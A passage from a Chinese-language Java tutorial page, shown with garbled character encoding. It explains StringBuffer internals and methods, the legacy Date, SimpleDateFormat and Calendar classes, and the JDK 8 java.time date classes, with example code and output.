<h4 id="10ã€StringBufferçš„æºç åˆ†æ"><a href="#10ã€StringBufferçš„æºç åˆ†æ" class="headerlink" title="10ã€StringBufferçš„æºç åˆ†æ"></a>10ã€StringBufferçš„æºç åˆ†æ</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æºç åˆ†æï¼š</span></span><br><span class="line"><span class="comment"> * String str = new String();//char[] value = new char[0];</span></span><br><span class="line"><span class="comment"> * String str1 = new String(&quot;abc&quot;);//char[] value = new char[]&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;&#125;;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * StringBuffer sb1 = new StringBuffer();//char[] value = new char[16];åº•å±‚åˆ›å»ºäº†ä¸€ä¸ªé•¿åº¦æ˜¯16çš„æ•°ç»„ã€‚</span></span><br><span class="line"><span class="comment"> * System.out.println(sb1.length());//</span></span><br><span class="line"><span class="comment"> * sb1.append(&#x27;a&#x27;);//value[0] = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment"> * sb1.append(&#x27;b&#x27;);//value[1] = &#x27;b&#x27;;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * StringBuffer sb2 = new StringBuffer(&quot;abc&quot;);//char[] value = new char[&quot;abc&quot;.length() + 16];</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * //é—®é¢˜1.System.out.println(sb2.length());//3</span></span><br><span class="line"><span class="comment"> * //é—®é¢˜2.æ‰©å®¹é—®é¢˜:å¦‚æœè¦æ·»åŠ çš„æ•°æ®åº•å±‚æ•°ç»„ç››ä¸ä¸‹äº†ï¼Œé‚£å°±éœ€è¦æ‰©å®¹åº•å±‚çš„æ•°ç»„ã€‚</span></span><br><span class="line"><span class="comment"> *        é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰©å®¹ä¸ºåŸæ¥å®¹é‡çš„2å€ + 2ï¼ŒåŒæ—¶å°†åŸæœ‰æ•°ç»„ä¸­çš„å…ƒç´ å¤åˆ¶åˆ°æ–°çš„æ•°ç»„ä¸­ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æ„ä¹‰ï¼šå¼€å‘ä¸­å»ºè®®å¤§å®¶ä½¿ç”¨ï¼šStringBuffer(int capacity) æˆ– StringBuilder(int capacity)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="11ã€StringBufferä¸­çš„å¸¸ç”¨æ–¹æ³•"><a href="#11ã€StringBufferä¸­çš„å¸¸ç”¨æ–¹æ³•" class="headerlink" title="11ã€StringBufferä¸­çš„å¸¸ç”¨æ–¹æ³•"></a>11ã€StringBufferä¸­çš„å¸¸ç”¨æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StringBufferçš„å¸¸ç”¨æ–¹æ³•ï¼š</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * StringBuffer append(xxx)ï¼šæä¾›äº†å¾ˆå¤šçš„append()æ–¹æ³•ï¼Œç”¨äºè¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥</span></span><br><span class="line"><span class="comment">     * StringBuffer delete(int start,int end)ï¼šåˆ é™¤æŒ‡å®šä½ç½®çš„å†…å®¹</span></span><br><span class="line"><span class="comment">     * StringBuffer replace(int start, int end, String str)ï¼šæŠŠ[start,end)ä½ç½®æ›¿æ¢ä¸ºstr</span></span><br><span class="line"><span class="comment">     * StringBuffer insert(int offset, xxx)ï¼šåœ¨æŒ‡å®šä½ç½®æ’å…¥xxx</span></span><br><span class="line"><span class="comment">     * StringBuffer reverse() ï¼šæŠŠå½“å‰å­—ç¬¦åºåˆ—é€†è½¬</span></span><br><span class="line"><span class="comment">     * public int indexOf(String str)</span></span><br><span class="line"><span class="comment">     * public String substring(int start,int end):è¿”å›ä¸€ä¸ªä»startå¼€å§‹åˆ°endç´¢å¼•ç»“æŸçš„å·¦é—­å³å¼€åŒºé—´çš„å­å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">     * public int length()</span></span><br><span class="line"><span class="comment">     * public char charAt(int n )</span></span><br><span class="line"><span class="comment">     * public void setCharAt(int n ,char ch)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * æ€»ç»“ï¼š</span></span><br><span class="line"><span class="comment">     *     å¢ï¼šappend(xxx)</span></span><br><span class="line"><span class="comment">     *     åˆ ï¼šdelete(int start,int end)</span></span><br><span class="line"><span class="comment">     *     æ”¹ï¼šsetCharAt(int n ,char ch) / replace(int start, int end, String str)</span></span><br><span class="line"><span class="comment">     *     æŸ¥ï¼šcharAt(int n )</span></span><br><span class="line"><span class="comment">     *     æ’ï¼šinsert(int offset, xxx)</span></span><br><span class="line"><span class="comment">     *     é•¿åº¦ï¼šlength();</span></span><br><span class="line"><span class="comment">     *     éå†ï¼šfor() + charAt() / toString()</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<p>12ã€Stringã€StringBufferã€StringBuilderæ•ˆç‡å¯¹æ¯”   â€”â€“ç›¸æ¯”Stringï¼Œå…¶ä»–ä¸¤ä¸ª</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å¯¹æ¯”Stringã€StringBufferã€StringBuilderä¸‰è€…çš„æ•ˆç‡ï¼š</span></span><br><span class="line"><span class="comment">     * ä»é«˜åˆ°ä½æ’åˆ—ï¼šStringBuilder &gt; StringBuffer &gt; String</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h3 id="2ã€JDK-8ä¹‹å‰çš„æ—¥æœŸæ—¶é—´API"><a href="#2ã€JDK-8ä¹‹å‰çš„æ—¥æœŸæ—¶é—´API" class="headerlink" title="2ã€JDK 8ä¹‹å‰çš„æ—¥æœŸæ—¶é—´API"></a>2ã€JDK 8ä¹‹å‰çš„æ—¥æœŸæ—¶é—´API</h3><p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/21debf6ef21a57f7c1120fe58649ef71--3936--f-18.png" alt="f-18"></p>
<h4 id="1ã€Systemç±»ä¸­è·å–æ—¶é—´æˆ³çš„æ–¹æ³•"><a href="#1ã€Systemç±»ä¸­è·å–æ—¶é—´æˆ³çš„æ–¹æ³•" class="headerlink" title="1ã€Systemç±»ä¸­è·å–æ—¶é—´æˆ³çš„æ–¹æ³•"></a>1ã€Systemç±»ä¸­è·å–æ—¶é—´æˆ³çš„æ–¹æ³•</h4><blockquote>
<p>Systemç±»æä¾›çš„public static long currentTimeMillis()ç”¨æ¥è¿”å›å½“å‰æ—¶é—´ä¸1970å¹´1æœˆ1æ—¥0æ—¶0åˆ†0ç§’ä¹‹é—´ä»¥æ¯«ç§’ä¸ºå•ä½çš„æ—¶é—´å·®ã€‚</p>
</blockquote>
<ul>
<li>æ­¤æ–¹æ³•é€‚äºè®¡ç®—æ—¶é—´å·®ã€‚</li>
<li>è®¡ç®—ä¸–ç•Œæ—¶é—´çš„ä¸»è¦æ ‡å‡†æœ‰ï¼š<ul>
<li>UTC(Coordinated Universal Time)</li>
<li>GMT(Greenwich Mean Time)</li>
<li>CST(Central Standard Time)</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="comment">//è¿”å›å½“å‰æ—¶é—´ä¸1970å¹´1æœˆ1æ—¥0æ—¶0åˆ†0ç§’ä¹‹é—´ä»¥æ¯«ç§’ä¸ºå•ä½çš„æ—¶é—´å·®ã€‚</span></span><br><span class="line">        <span class="comment">//ç§°ä¸ºæ—¶é—´æˆ³</span></span><br></pre></td></tr></table></figure>

<h4 id="2ã€Javaä¸­ä¸¤ä¸ªDateç±»çš„ä½¿ç”¨"><a href="#2ã€Javaä¸­ä¸¤ä¸ªDateç±»çš„ä½¿ç”¨" class="headerlink" title="2ã€Javaä¸­ä¸¤ä¸ªDateç±»çš„ä½¿ç”¨"></a>2ã€Javaä¸­ä¸¤ä¸ªDateç±»çš„ä½¿ç”¨</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateDemo</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * java.util.Dateç±» ---&gt; è¡¨ç¤ºç‰¹å®šçš„ç¬é—´ï¼Œç²¾ç¡®åˆ°æ¯«ç§’</span></span><br><span class="line"><span class="comment">     *            |---java.sql.Dateç±»</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 1.ä¸¤ä¸ªæ„é€ å™¨çš„ä½¿ç”¨</span></span><br><span class="line"><span class="comment">     *     &gt;æ„é€ å™¨ä¸€ï¼šDate()ï¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”å½“å‰æ—¶é—´çš„Dateå¯¹è±¡</span></span><br><span class="line"><span class="comment">     *     &gt;æ„é€ å™¨äºŒï¼šåˆ›å»ºæŒ‡å®šæ¯«ç§’æ•°çš„Dateå¯¹è±¡</span></span><br><span class="line"><span class="comment">     * 2.ä¸¤ä¸ªæ–¹æ³•çš„ä½¿ç”¨</span></span><br><span class="line"><span class="comment">     *     &gt;toString():æ˜¾ç¤ºå½“å‰çš„å¹´ã€æœˆã€æ—¥ã€æ—¶ã€åˆ†ã€ç§’</span></span><br><span class="line"><span class="comment">     *     &gt;getTime():è·å–å½“å‰Dateå¯¹è±¡å¯¹åº”çš„æ¯«ç§’æ•°ã€‚ï¼ˆæ—¶é—´æˆ³ï¼‰</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 3. java.sql.Dateå¯¹åº”ç€æ•°æ®åº“ä¸­çš„æ—¥æœŸç±»å‹çš„å˜é‡</span></span><br><span class="line"><span class="comment">     *     &gt;å¦‚ä½•å®ä¾‹åŒ–</span></span><br><span class="line"><span class="comment">     *     &gt;å¦‚ä½•å°†java.util.Dateå¯¹è±¡è½¬æ¢ä¸ºjava.sql.Dateå¯¹è±¡</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//æ„é€ å™¨ä¸€ï¼šDate()ï¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”å½“å‰æ—¶é—´çš„Dateå¯¹è±¡</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        System.out.println(date1.toString());   <span class="comment">//Tue Sep 17 13:39:46 CST 2024</span></span><br><span class="line"></span><br><span class="line">        System.out.println(date1.getTime());    <span class="comment">//1726551586623</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ å™¨äºŒï¼šåˆ›å»ºæŒ‡å®šæ¯«ç§’æ•°çš„Dateå¯¹è±¡</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">1726551586623L</span>);</span><br><span class="line">        System.out.println(date2.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºjava.sql.Dateå¯¹è±¡</span></span><br><span class="line">        java.sql.<span class="type">Date</span> <span class="variable">date3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.sql.Date(<span class="number">35635325345L</span>);</span><br><span class="line">        System.out.println(date3);  <span class="comment">//1971-02-17</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å¦‚ä½•å°†java.util.Dateå¯¹è±¡è½¬æ¢ä¸ºjava.sql.Dateå¯¹è±¡</span></span><br><span class="line">        <span class="comment">//æƒ…å†µä¸€ï¼š</span></span><br><span class="line"><span class="comment">//        Date date4 = new java.sql.Date(2343243242323L);</span></span><br><span class="line"><span class="comment">//        java.sql.Date date5 = (java.sql.Date) date4;</span></span><br><span class="line">        <span class="comment">//æƒ…å†µäºŒï¼š</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        java.sql.<span class="type">Date</span> <span class="variable">date7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.sql.Date(date6.getTime());</span><br><span class="line">        System.out.println(date7);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/dd405cec8a709e7320fbee9bd1727cda--f922--image-20240917134808187.png" alt="image-20240917134808187"></p>
<h4 id="3ã€SimpleDateFormateçš„ä½¿ç”¨"><a href="#3ã€SimpleDateFormateçš„ä½¿ç”¨" class="headerlink" title="3ã€SimpleDateFormateçš„ä½¿ç”¨"></a>3ã€SimpleDateFormateçš„ä½¿ç”¨</h4><ul>
<li>Dateç±»çš„APIä¸æ˜“äºå›½é™…åŒ–ï¼Œå¤§éƒ¨åˆ†è¢«åºŸå¼ƒäº†ï¼Œjava.text.SimpleDateFormatç±»æ˜¯ä¸€ä¸ªä¸ä¸è¯­è¨€ç¯å¢ƒæœ‰å…³çš„æ–¹å¼æ¥æ ¼å¼åŒ–å’Œè§£ææ—¥æœŸçš„å…·ä½“ç±»ã€‚</li>
<li>å®ƒå…è®¸è¿›è¡Œ<ul>
<li>æ ¼å¼åŒ–ï¼šæ—¥æœŸâ€”&gt;æ–‡æœ¬</li>
<li>è§£æï¼šæ–‡æœ¬â€”&gt;æ—¥æœŸ</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/a51b3ad3b6fc096f0abfbedb5a5db10a--7906--image-20240917135507627.png" alt="image-20240917135507627"></p>
<ul>
<li>ä¸»è¦ç”¨äºå¯¹æ ¼å¼æ—¥æœŸçš„è¯»å–ï¼Œæˆ–è€…å¯¹æ—¥æœŸè¿›è¡Œè‡ªå®šä¹‰æ ¼å¼åŒ–</li>
</ul>
<h4 id="4ã€Calendaræ—¥å†ç±»çš„ä½¿ç”¨"><a href="#4ã€Calendaræ—¥å†ç±»çš„ä½¿ç”¨" class="headerlink" title="4ã€Calendaræ—¥å†ç±»çš„ä½¿ç”¨"></a>4ã€Calendaræ—¥å†ç±»çš„ä½¿ç”¨</h4><ul>
<li>Calendaræ˜¯ä¸€ä¸ªæŠ½è±¡åŸºç±»ï¼Œä¸»ç”¨ç”¨äºå®Œæˆæ—¥æœŸå­—æ®µä¹‹é—´ç›¸äº’æ“ä½œçš„åŠŸèƒ½ã€‚</li>
<li>è·å–Calendarå®ä¾‹çš„æ–¹æ³•<ul>
<li>ä½¿ç”¨Calendar.getInstance()æ–¹æ³•</li>
<li>è°ƒç”¨å®ƒçš„å­ç±»GregorianCalendarçš„æ„é€ å™¨ã€‚</li>
</ul>
</li>
<li>ä¸€ä¸ªCalendarçš„å®ä¾‹æ˜¯ç³»ç»Ÿæ—¶é—´çš„æŠ½è±¡è¡¨ç¤ºï¼Œé€šè¿‡get(intfield)æ–¹æ³•æ¥å–å¾—æƒ³è¦çš„æ—¶é—´ä¿¡æ¯ã€‚æ¯”å¦‚YEARã€MONTHã€DAY_OF_WEEKã€HOUR_OF_DAY ã€MINUTEã€SECOND<ul>
<li>public void set(intfield,intvalue)</li>
<li>public void add(intfield,intamount)</li>
<li>public final Date getTime()</li>
<li>public final void setTime(Date date)</li>
</ul>
</li>
<li>æ³¨æ„:<ul>
<li>è·å–æœˆä»½æ—¶ï¼šä¸€æœˆæ˜¯0ï¼ŒäºŒæœˆæ˜¯1ï¼Œä»¥æ­¤ç±»æ¨ï¼Œ12æœˆæ˜¯11</li>
<li>è·å–æ˜ŸæœŸæ—¶ï¼šå‘¨æ—¥æ˜¯1ï¼Œå‘¨äºŒæ˜¯2ï¼Œã€‚ã€‚ã€‚ã€‚å‘¨å…­æ˜¯7</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateFormateDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">calendar</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å¾—æ˜¯è¯¥æœˆç¬¬å‡ å¤©</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">days</span> <span class="operator">=</span> calendar.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">        System.out.println(days); <span class="comment">// 17</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¯å˜æ€§</span></span><br><span class="line">        calendar.set(Calendar.DAY_OF_MONTH, days + <span class="number">1</span>);</span><br><span class="line">        days = calendar.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">        System.out.println(days);  <span class="comment">// 18</span></span><br><span class="line"></span><br><span class="line">        calendar.add(Calendar.DAY_OF_MONTH, <span class="number">6</span>);</span><br><span class="line">        days = calendar.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">        System.out.println(days); <span class="comment">//24</span></span><br><span class="line"></span><br><span class="line">        System.out.println(calendar.getTime()); <span class="comment">//Tue Sep 24 14:29:29 CST 2024</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        calendar.setTime(date);</span><br><span class="line">        System.out.println(calendar.getTime());<span class="comment">// Tue Sep 17 14:29:29 CST 2024</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3ã€JDK8ä¸­æ—¥æœŸAPIçš„ä»‹ç»"><a href="#3ã€JDK8ä¸­æ—¥æœŸAPIçš„ä»‹ç»" class="headerlink" title="3ã€JDK8ä¸­æ—¥æœŸAPIçš„ä»‹ç»"></a>3ã€JDK8ä¸­æ—¥æœŸAPIçš„ä»‹ç»</h3><ul>
<li>æ–°æ—¥æœŸæ—¶é—´APIå‡ºç°çš„èƒŒæ™¯</li>
</ul>
<blockquote>
<p>å¦‚æœæˆ‘ä»¬å¯ä»¥è·Ÿåˆ«äººè¯´ï¼šâ€œæˆ‘ä»¬åœ¨1502643933071è§é¢ï¼Œåˆ«æ™šäº†ï¼â€é‚£ä¹ˆå°±å†ç®€å•ä¸è¿‡äº†ã€‚ä½†æ˜¯æˆ‘ä»¬å¸Œæœ›æ—¶é—´ä¸æ˜¼å¤œå’Œå››å­£æœ‰å…³ï¼Œäºæ˜¯äº‹æƒ…å°±å˜å¤æ‚äº†ã€‚JDK 1.0ä¸­åŒ…å«äº†ä¸€ä¸ªjava.util.Dateç±»ï¼Œä½†æ˜¯å®ƒçš„å¤§å¤šæ•°æ–¹æ³•å·²ç»åœ¨JDK 1.1å¼•å…¥Calendarç±»ä¹‹åè¢«å¼ƒç”¨äº†ã€‚è€ŒCalendarå¹¶ä¸æ¯”Dateå¥½å¤šå°‘ã€‚å®ƒä»¬é¢ä¸´çš„é—®é¢˜æ˜¯ï¼š</p>
<blockquote>
<p>å¯å˜æ€§ï¼šåƒæ—¥æœŸå’Œæ—¶é—´è¿™æ ·çš„ç±»åº”è¯¥æ˜¯ä¸å¯å˜çš„ã€‚</p>
</blockquote>
<blockquote>
<p>åç§»æ€§ï¼šDateä¸­çš„å¹´ä»½æ˜¯ä»1900å¼€å§‹çš„ï¼Œè€Œæœˆä»½éƒ½ä»0å¼€å§‹ã€‚</p>
</blockquote>
<blockquote>
<p>æ ¼å¼åŒ–ï¼šæ ¼å¼åŒ–åªå¯¹Dateæœ‰ç”¨ï¼ŒCalendaråˆ™ä¸è¡Œã€‚</p>
</blockquote>
<blockquote>
<p>æ­¤å¤–ï¼Œå®ƒä»¬ä¹Ÿä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼›ä¸èƒ½å¤„ç†é—°ç§’ç­‰ã€‚</p>
</blockquote>
<p>æ€»ç»“ï¼šå¯¹æ—¥æœŸå’Œæ—¶é—´çš„æ“ä½œä¸€ç›´æ˜¯Javaç¨‹åºå‘˜æœ€ç—›è‹¦çš„åœ°æ–¹ä¹‹ä¸€ã€‚</p>
</blockquote>
<ul>
<li>Java 8 å¸æ”¶äº†Joda-Time çš„ç²¾åï¼Œä»¥ä¸€ä¸ªæ–°çš„å¼€å§‹ä¸ºJava åˆ›å»ºä¼˜ç§€çš„APIã€‚æ–°çš„java.time ä¸­åŒ…å«äº†æ‰€æœ‰å…³äº<strong>æœ¬åœ°æ—¥æœŸï¼ˆLocalDateï¼‰ã€æœ¬åœ°æ—¶é—´ï¼ˆLocalTimeï¼‰ã€æœ¬åœ°æ—¥æœŸæ—¶é—´ï¼ˆLocalDateTimeï¼‰ã€æ—¶åŒºï¼ˆZonedDateTimeï¼‰å’ŒæŒç»­æ—¶é—´ï¼ˆDurationï¼‰çš„ç±»</strong>ã€‚å†å²æ‚ ä¹…çš„Date ç±»æ–°å¢äº†toInstant() æ–¹æ³•ï¼Œç”¨äºæŠŠDate è½¬æ¢æˆæ–°çš„è¡¨ç¤ºå½¢å¼ã€‚è¿™äº›æ–°å¢çš„æœ¬åœ°åŒ–æ—¶é—´æ—¥æœŸAPI å¤§å¤§ç®€åŒ–äº†æ—¥æœŸæ—¶é—´å’Œæœ¬åœ°åŒ–çš„ç®¡ç†ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.timeâ€“åŒ…å«å€¼å¯¹è±¡çš„åŸºç¡€åŒ…</span><br><span class="line">java.time.chronoâ€“æä¾›å¯¹ä¸åŒçš„æ—¥å†ç³»ç»Ÿçš„è®¿é—®java.time.formatâ€“æ ¼å¼åŒ–å’Œè§£ææ—¶é—´å’Œæ—¥æœŸjava.time.temporalâ€“åŒ…æ‹¬åº•å±‚æ¡†æ¶å’Œæ‰©å±•ç‰¹æ€§java.time.zoneâ€“åŒ…å«æ—¶åŒºæ”¯æŒçš„ç±»</span><br><span class="line"></span><br><span class="line">è¯´æ˜ï¼šå¤§å¤šæ•°å¼€å‘è€…åªä¼šç”¨åˆ°åŸºç¡€åŒ…å’ŒformatåŒ…ï¼Œä¹Ÿå¯èƒ½ä¼šç”¨åˆ°temporalåŒ…ã€‚å› æ­¤ï¼Œå°½ç®¡æœ‰68ä¸ªæ–°çš„å…¬å¼€ç±»å‹ï¼Œå¤§å¤šæ•°å¼€å‘è€…ï¼Œå¤§æ¦‚å°†åªä¼šç”¨åˆ°å…¶ä¸­çš„ä¸‰åˆ†ä¹‹ä¸€ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="1-LocalDateã€LocalTimeã€LocalDateTimeçš„ä½¿ç”¨"><a href="#1-LocalDateã€LocalTimeã€LocalDateTimeçš„ä½¿ç”¨" class="headerlink" title="1.LocalDateã€LocalTimeã€LocalDateTimeçš„ä½¿ç”¨"></a>1.LocalDateã€LocalTimeã€LocalDateTimeçš„ä½¿ç”¨</h4><ul>
<li><p>LocalDateã€LocalTimeã€LocalDateTime ç±»æ˜¯å…¶ä¸­è¾ƒé‡è¦çš„å‡ ä¸ªç±»ï¼Œå®ƒä»¬çš„å®ä¾‹æ˜¯<strong>ä¸å¯å˜çš„å¯¹è±¡</strong>ï¼Œåˆ†åˆ«è¡¨ç¤ºä½¿ç”¨ISO-8601æ—¥å†ç³»ç»Ÿçš„æ—¥æœŸã€æ—¶é—´ã€æ—¥æœŸå’Œæ—¶é—´ã€‚å®ƒä»¬æä¾›äº†ç®€å•çš„æœ¬åœ°æ—¥æœŸæˆ–æ—¶é—´ï¼Œå¹¶ä¸åŒ…å«å½“å‰çš„æ—¶é—´ä¿¡æ¯ï¼Œä¹Ÿä¸åŒ…å«ä¸æ—¶åŒºç›¸å…³çš„ä¿¡æ¯ã€‚</p>
<ul>
<li>LocalDateä»£è¡¨IOSæ ¼å¼ï¼ˆyyyy-MM-ddï¼‰çš„æ—¥æœŸ,å¯ä»¥å­˜å‚¨ç”Ÿæ—¥ã€çºªå¿µæ—¥ç­‰æ—¥æœŸã€‚</li>
<li>LocalTimeè¡¨ç¤ºä¸€ä¸ªæ—¶é—´ï¼Œè€Œä¸æ˜¯æ—¥æœŸã€‚</li>
<li>LocalDateTimeæ˜¯ç”¨æ¥è¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´çš„ï¼Œ<strong>è¿™æ˜¯ä¸€ä¸ªæœ€å¸¸ç”¨çš„ç±»ä¹‹ä¸€</strong>ã€‚</li>
</ul>
</li>
<li><p>æ³¨ï¼šISO-8601æ—¥å†ç³»ç»Ÿæ˜¯å›½é™…æ ‡å‡†åŒ–ç»„ç»‡åˆ¶å®šçš„ç°ä»£å…¬æ°‘çš„æ—¥æœŸå’Œæ—¶é—´çš„è¡¨ç¤ºæ³•ï¼Œä¹Ÿå°±æ˜¯å…¬å†ã€‚</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.time.LocalDate;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateFormate8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//now():è·å–å½“å‰çš„æ—¥æœŸã€æ—¶é—´ã€æ—¥æœŸ+æ—¶é—´</span></span><br><span class="line">        <span class="type">LocalDate</span> <span class="variable">localDate</span> <span class="operator">=</span> LocalDate.now();</span><br><span class="line">        <span class="type">LocalTime</span> <span class="variable">localTime</span> <span class="operator">=</span> LocalTime.now();</span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">localDateTime</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line"></span><br><span class="line">        System.out.println(localDate); <span class="comment">//2024-09-17</span></span><br><span class="line">        System.out.println(localTime);<span class="comment">//14:59:25.963644900</span></span><br><span class="line">        System.out.println(localDateTime);<span class="comment">//2024-09-17T14:59:25.963644900</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//of():è®¾ç½®æŒ‡å®šçš„å¹´ã€æœˆã€æ—¥ã€æ—¶ã€åˆ†ã€ç§’ã€‚æ²¡æœ‰åç§»é‡</span></span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">localDateTime1</span> <span class="operator">=</span> LocalDateTime.of(<span class="number">2024</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">25</span>, <span class="number">52</span>);</span><br><span class="line">        System.out.println(localDateTime1); <span class="comment">//2024-12-06T13:25:52</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//getXxx()ï¼šè·å–ç›¸å…³çš„å±æ€§</span></span><br><span class="line">        System.out.println(localDateTime.getDayOfMonth()); <span class="comment">//17</span></span><br><span class="line">        System.out.println(localDateTime.getDayOfWeek());<span class="comment">//TUESDAY</span></span><br><span class="line">        System.out.println(localDateTime.getMonth());<span class="comment">//SEPTEMBER</span></span><br><span class="line">        System.out.println(localDateTime.getMonthValue());<span class="comment">//9</span></span><br><span class="line">        System.out.println(localDateTime.getMinute());<span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½“ç°ä¸å¯å˜æ€§</span></span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">localDateTime2</span> <span class="operator">=</span> localDateTime.withDayOfMonth(<span class="number">23</span>);</span><br><span class="line">        System.out.println(localDateTime); <span class="comment">//2024-09-17T15:03:22.654453100</span></span><br><span class="line">        System.out.println(localDateTime2);<span class="comment">//2024-09-23T15:03:22.654453100</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/036c79ac6d7da45dda9da1226bf8facd--eb96--01.png" alt="01"></p>
<h4 id="2ã€Instantç±»çš„ä½¿ç”¨"><a href="#2ã€Instantç±»çš„ä½¿ç”¨" class="headerlink" title="2ã€Instantç±»çš„ä½¿ç”¨"></a>2ã€Instantç±»çš„ä½¿ç”¨</h4><ul>
<li>Instantï¼šæ—¶é—´çº¿ä¸Šçš„ä¸€ä¸ªç¬æ—¶ç‚¹ã€‚è¿™å¯èƒ½è¢«ç”¨æ¥è®°å½•åº”ç”¨ç¨‹åºä¸­çš„äº‹ä»¶æ—¶é—´æˆ³ã€‚</li>
